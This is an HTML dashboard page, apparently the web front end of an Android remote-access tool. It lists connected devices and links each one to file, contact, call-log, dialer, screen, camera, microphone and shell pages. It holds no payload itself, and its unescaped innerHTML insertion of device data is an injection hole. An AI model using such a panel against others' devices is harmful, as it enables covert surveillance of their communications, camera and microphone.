<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Remote Access Dashboard</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
    }

    header {
      text-align: center;
      color: white;
      margin-bottom: 40px;
    }

    header h1 {
      font-size: 2.5em;
      margin-bottom: 10px;
      text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
    }

    header p {
      font-size: 1.1em;
      opacity: 0.9;
    }

    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
      margin-bottom: 30px;
    }

    .stat-card {
      background: white;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
      text-align: center;
    }

    .stat-card h3 {
      color: #667eea;
      font-size: 2em;
      margin-bottom: 5px;
    }

    .stat-card p {
      color: #666;
      font-size: 0.9em;
    }

    .devices-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
      gap: 20px;
    }

    .device-card {
      background: white;
      border-radius: 12px;
      padding: 24px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
      transition: transform 0.2s, box-shadow 0.2s;
      cursor: pointer;
    }

    .device-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
    }

    .device-header {
      display: flex;
      align-items: center;
      margin-bottom: 16px;
      padding-bottom: 16px;
      border-bottom: 2px solid #f0f0f0;
    }

    .device-icon {
      width: 50px;
      height: 50px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      margin-right: 15px;
    }

    .device-info h3 {
      font-size: 1.2em;
      color: #333;
      margin-bottom: 5px;
    }

    .device-info p {
      color: #666;
      font-size: 0.9em;
    }

    .device-details {
      margin-bottom: 16px;
    }

    .detail-row {
      display: flex;
      justify-content: space-between;
      padding: 8px 0;
      border-bottom: 1px solid #f5f5f5;
    }

    .detail-label {
      color: #666;
      font-weight: 500;
    }

    .detail-value {
      color: #333;
      font-weight: 600;
    }

    .status-badge {
      display: inline-block;
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 0.85em;
      font-weight: 600;
    }

    .status-online {
      background: #d1fae5;
      color: #065f46;
    }

    .device-actions {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    .btn {
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      font-size: 0.9em;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
      text-decoration: none;
      text-align: center;
      display: block;
    }

    .btn-primary {
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
    }

    .btn-primary:hover {
      transform: scale(1.05);
      box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
    }

    .btn-secondary {
      background: #f3f4f6;
      color: #374151;
    }

    .btn-secondary:hover {
      background: #e5e7eb;
    }

    .empty-state {
      background: white;
      border-radius: 12px;
      padding: 60px 20px;
      text-align: center;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
    }

    .empty-state h2 {
      color: #333;
      margin-bottom: 10px;
    }

    .empty-state p {
      color: #666;
      font-size: 1.1em;
    }

    .loading {
      text-align: center;
      color: white;
      font-size: 1.2em;
      padding: 40px;
    }
  </style>
</head>

<body>
  <div class="container">
    <header>
      <h1>🔐 Remote Access Dashboard</h1>
      <p>Manage your connected devices</p>
    </header>

    <div class="stats" id="stats">
      <div class="stat-card">
        <h3 id="device-count">0</h3>
        <p>Connected Devices</p>
      </div>
      <div class="stat-card">
        <h3 id="uptime">0s</h3>
        <p>Server Uptime</p>
      </div>
    </div>

    <div id="devices-container" class="loading">
      Loading devices...
    </div>
  </div>

  <script src="/js/api.js"></script>
  <script>
    let devices = [];

    async function loadDevices() {
      try {
        const response = await api.getDevices();
        devices = response.devices;

        document.getElementById('device-count').textContent = devices.length;
        renderDevices();
      } catch (error) {
        console.error('Failed to load devices:', error);
        document.getElementById('devices-container').innerHTML = `
          <div class="empty-state">
            <h2>❌ Error Loading Devices</h2>
            <p>${error.message}</p>
          </div>
        `;
      }
    }

    async function loadStats() {
      try {
        const response = await api.request('/stats');
        const uptime = Math.floor(response.stats.uptime);
        const hours = Math.floor(uptime / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = uptime % 60;

        document.getElementById('uptime').textContent =
          hours > 0 ? `${hours}h ${minutes}m` : `${minutes}m ${seconds}s`;
      } catch (error) {
        console.error('Failed to load stats:', error);
      }
    }

    function renderDevices() {
      const container = document.getElementById('devices-container');

      if (devices.length === 0) {
        container.className = '';
        container.innerHTML = `
          <div class="empty-state">
            <h2>📱 No Devices Connected</h2>
            <p>Launch the Android app to connect a device</p>
          </div>
        `;
        return;
      }

      container.className = 'devices-grid';
      container.innerHTML = devices.map(device => `
        <div class="device-card">
          <div class="device-header">
            <div class="device-icon">📱</div>
            <div class="device-info">
              <h3>${device.model || 'Unknown Device'}</h3>
              <p><span class="status-badge status-online">● Online</span></p>
            </div>
          </div>
          
          <div class="device-details">
            <div class="detail-row">
              <span class="detail-label">Device ID</span>
              <span class="detail-value">${device.deviceId.substring(0, 8)}...</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">Android</span>
              <span class="detail-value">${device.androidVersion || 'N/A'}</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">Battery</span>
              <span class="detail-value">${device.battery || 'N/A'}%</span>
            </div>
            <div class="detail-row">
              <span class="detail-label">Connected</span>
              <span class="detail-value">${new Date(device.connectedAt).toLocaleTimeString()}</span>
            </div>
          </div>

          <div class="device-actions">
            <a href="device-info.html?deviceId=${device.deviceId}" class="btn btn-primary">📊 Info</a>
            <a href="file-manager.html?deviceId=${device.deviceId}" class="btn btn-secondary">📂 Files</a>
            <a href="apps.html?deviceId=${device.deviceId}" class="btn btn-secondary">📱 Apps</a>
            <a href="contacts.html?deviceId=${device.deviceId}" class="btn btn-secondary">📇 Contacts</a>
            <a href="calls.html?deviceId=${device.deviceId}" class="btn btn-secondary">📞 Logs</a>
            <a href="dialer.html?deviceId=${device.deviceId}" class="btn btn-secondary">📲 Dialer</a>
            <a href="screen-stream.html?deviceId=${device.deviceId}" class="btn btn-secondary">🖥️ Screen</a>
            <a href="cam-stream.html?deviceId=${device.deviceId}" class="btn btn-secondary">📸 Camera</a>
            <a href="mic-stream.html?deviceId=${device.deviceId}" class="btn btn-secondary">🎙️ Mic</a>
            <a href="shell.html?deviceId=${device.deviceId}" class="btn btn-secondary">💻 Shell</a>
          </div>
        </div>
      `).join('');
    }

    // Initial load
    loadDevices();
    loadStats();

    // Auto-refresh every 5 seconds
    setInterval(() => {
      loadDevices();
      loadStats();
    }, 5000);
  </script>
</body>

</html>
